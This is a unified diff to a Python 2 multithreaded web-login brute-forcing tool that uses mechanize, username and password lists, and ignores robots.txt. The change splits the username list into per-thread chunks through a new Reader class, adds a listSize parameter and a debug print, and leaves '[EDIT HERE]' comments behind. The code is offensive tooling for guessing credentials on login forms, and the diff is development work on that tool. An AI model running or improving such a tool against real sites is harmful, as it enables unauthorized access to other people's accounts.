@@ -1,5 +1,6 @@
 import actions, utils, sys, mechanize
 import threading
+from reader import Reader
 
 ##################################################################
 #
@@ -16,7 +17,7 @@ import threading
 ##################################################################
 
 class BruteForcing(threading.Thread):
-	def __init__(self, optURL, optUsrList, optPassList, pid):
+	def __init__(self, optURL, optUsrList, optPassList, pid, listSize):
 		###############################################################
 		#
 		#	@Ic3W4ll
@@ -41,11 +42,10 @@ class BruteForcing(threading.Thread):
 		self.frmPassField = ''
 		self.lstUsername = optUsrList
 		self.lstPassword = optPassList
-		#self.szPassword = actions.subaction_countListSize(self.lstPassword)
 		self.fndData = []
 		self.isPassFound = False
 		self.id = pid
-		#self.batchSize = batchSize
+		self.listSize = listSize
 
 		#self.actTestConnection()
 
@@ -115,9 +115,16 @@ class BruteForcing(threading.Thread):
 	def run(self):
 		#Start brute forcing
 		###############################
-		for idxUsername in self.lstUsername:
+		startPoint = (self.id - 1) * self.listSize
+		endPoint = startPoint + self.listSize
+		# [EDIT HERE] [this doesn't loop]
+		lstUsername = Reader(self.lstUsername).read(startPoint, endPoint)
+		# [this does loop]
+		# lstUsername = Reader(open('userlist.txt')).read(startPoint, endPoint)
+		for idxUsername in lstUsername:
 			count = 0
 			idxUsername = idxUsername.replace('\n', '')
+			print idxUsername
 			proc = mechanize.Browser()
 			proc.addheaders = [('User-Agent', self.varUserAgent)]
 			proc.set_handle_robots(False)
